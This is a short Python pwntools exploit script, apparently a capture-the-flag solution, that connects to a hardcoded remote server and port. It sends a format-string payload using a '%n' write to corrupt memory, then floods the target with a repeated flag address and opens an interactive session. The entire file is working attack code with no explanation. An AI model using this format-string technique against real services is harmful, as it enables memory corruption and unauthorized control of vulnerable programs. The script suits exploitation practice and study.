from pwn import *
context(arch="i386", os="linux")

server = "52.25.103.221"
port = 9003

r = remote(server, port)
#r = process("./mic_for_pwn")

print r.recv()
payload = "%100000c%6$n"

r.send(payload + "\x0a")
for i in xrange(40): print r.recv()

addr_flag = 0x0804a0a0
payload = p32(addr_flag) * 0x100
r.send(payload + "\x0a")

print r.recv()
r.interactive()
